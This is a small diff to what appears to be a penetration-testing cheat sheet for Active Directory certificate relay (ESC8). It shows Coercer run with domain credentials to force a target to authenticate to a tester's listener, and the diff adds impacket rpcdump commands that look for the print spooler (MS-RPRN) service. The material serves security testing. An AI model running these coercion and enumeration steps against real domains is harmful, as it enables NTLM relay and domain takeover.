@@ -214,6 +214,12 @@ esc8 => relayx ntlm (attack can be played both with and without account)
 git clone https://github.com/p0dalirius/Coercer.git
 cd Coercer && make
 ./Coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <Pentester-IP> <target>
+
+
+#OtherWay
+
+rpcdump.py DC02.<domain.local> | grep -A 6 MS-RPRN
+impacket-rpcdump <IP> | grep -A6 spool 
 ```
 
 **esc8** 
